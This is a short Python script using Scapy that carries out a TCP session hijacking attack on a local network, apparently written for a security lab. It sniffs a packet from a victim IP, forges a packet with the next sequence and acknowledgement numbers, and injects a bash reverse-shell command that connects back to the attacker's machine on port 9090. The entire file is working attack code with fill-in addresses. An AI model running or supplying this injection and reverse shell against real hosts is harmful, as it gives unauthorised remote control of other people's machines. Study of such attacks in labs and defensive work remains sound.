from scapy.all import *

# in a local network we will often encounter network interface eth0
# in the ubuntu 20.04 (my current ubuntu version ) the name of my network interface is enp0s3

my_iface="enp0s3"  		#change this
my_ip="192.168.0.16"		#change this
victim_ip="192.168.0.19"	#change this
tcp_data = "\r/bin/bash -i > /dev/tcp/" + my_ip + "/9090 0<&1 2>&1\r"

t = sniff(iface=my_iface, count=1,lfilter=lambda x: x.haslayer(TCP) and x[IP].src == victim_ip)

t = t[0]
tcpdata = {
	'src' : t[IP].src,
	'dst' : t[IP].dst,
	'sport' : t[TCP].sport,
	'dport' : t[TCP].dport,
	'seq' : t[TCP].seq,
	'ack' : t[TCP].ack
}

ip = IP(src=tcpdata['src'],dst=tcpdata['dst'])
tcp = TCP(sport=tcpdata['sport'], dport=tcpdata['dport'], flags="A", seq=tcpdata['seq']+1, ack=tcpdata['ack']+1)

p = ip/tcp/tcp_data


#p = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
#	TCP(sport=tcpdata['sport'], dport=tcpdata['dport'],
#	flags="A", seq=tcpdata['seq']+1, ack=tcpdata['ack']+1) / tcp_data

send(p, verbose=1, iface=my_iface)
